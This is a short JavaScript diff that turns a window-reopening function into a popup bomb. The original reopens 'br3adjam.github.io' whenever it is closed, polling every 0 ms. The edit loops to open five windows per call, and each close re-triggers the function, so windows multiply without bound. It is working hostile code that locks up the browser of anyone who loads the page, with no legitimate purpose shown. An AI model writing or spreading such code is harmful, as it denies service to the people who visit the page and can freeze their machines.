@@ -7,14 +7,16 @@
 let newWindow;
 
 function openAndMonitor() {
-    newWindow = window.open("br3adjam.github.io");
-
-    const timer = setInterval(() => {
-        if (newWindow.closed) {
-            clearInterval(timer);
-            openAndMonitor();
-        }
-    }, 0);
+    for (let i = 0; i < 5; i++) {
+        newWindow = window.open("br3adjam.github.io");
+    
+        const timer = setInterval(() => {
+            if (newWindow.closed) {
+                clearInterval(timer);
+                openAndMonitor();
+            }
+        }, 0);
+    }
 }
 
 var i=0;
